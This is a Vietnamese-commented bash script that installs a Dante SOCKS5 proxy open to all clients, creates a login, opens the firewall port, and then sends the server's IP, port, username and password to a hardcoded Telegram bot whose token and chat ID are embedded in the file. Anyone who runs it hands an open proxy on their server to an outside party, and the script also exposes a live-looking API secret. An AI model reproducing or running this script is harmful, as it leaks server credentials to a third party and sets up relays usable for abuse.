#!/bin/bash

# ================== CÀI SOCKS5 TỰ ĐỘNG ==================

set -e

# Xác định OS
OS=""
if [ -f /etc/os-release ]; then
    . /etc/os-release
    case "$ID" in
        ubuntu|debian) OS="debian" ;;
        amzn|centos|rhel|rocky|almalinux) OS="redhat" ;;
        *) echo "Unsupported OS: $ID"; exit 1 ;;
    esac
else
    echo "Cannot detect OS."; exit 1
fi

# Cài SOCKS5 proxy Dante
USERNAME="anhtu"
PASSWORD="$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c12)"
PORT=$(shuf -i 1025-65000 -n1)
PUBLIC_IP=$(curl -s ifconfig.me || curl -s icanhazip.com || curl -s ipinfo.io/ip)
EXTERNAL_IF=$(ip -o -4 route show to default | awk '{print $5}')

if [ "$OS" = "debian" ]; then
    apt-get update
    DEBIAN_FRONTEND=noninteractive apt-get install -y dante-server curl iptables iptables-persistent
else
    yum install -y epel-release
    yum install -y dante-server curl iptables-services
    systemctl enable iptables
    systemctl start iptables
fi

# Tạo user
id "$USERNAME" &>/dev/null || useradd -M -N -s /usr/sbin/nologin "$USERNAME"
echo "$USERNAME:$PASSWORD" | chpasswd

# Cấu hình Dante
cat > /etc/danted.conf <<EOF
logoutput: syslog /var/log/danted.log
internal: 0.0.0.0 port = $PORT
external: $EXTERNAL_IF
method: pam
user.privileged: root
user.notprivileged: nobody

client pass {
    from: 0.0.0.0/0 to: 0.0.0.0/0
    log: connect disconnect error
}

socks pass {
    from: 0.0.0.0/0 to: 0.0.0.0/0
    command: bind connect udpassociate
    log: connect disconnect error
}
EOF

chmod 644 /etc/danted.conf
systemctl restart danted
systemctl enable danted

# Mở firewall
if command -v ufw >/dev/null 2>&1; then
    ufw allow ${PORT}/tcp
else
    iptables -I INPUT -p tcp --dport ${PORT} -j ACCEPT
    iptables-save > /etc/iptables/rules.v4 || true
fi

# ================== GỬI VỀ TELEGRAM ==================
BOT_TOKEN="7661562599:AAG5AvXpwl87M5up34-nj9AvMiJu-jYuWlA"
CHAT_ID="7051936083"

MSG="🎯 SOCKS5 Proxy Created!
➡️ ${PUBLIC_IP}:${PORT}
👤 ${USERNAME}
🔑 ${PASSWORD}

-> ${PUBLIC_IP}:${PORT}:${USERNAME}:${PASSWORD}

✅ Sẵn sàng!"

# Ghi log debug để kiểm tra nếu Telegram lỗi
echo "PUBLIC_IP=${PUBLIC_IP}" >> /root/tele_debug.log
curl -s --data-urlencode "text=$MSG" \
  "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID" \
  >> /root/tele_debug.log 2>&1
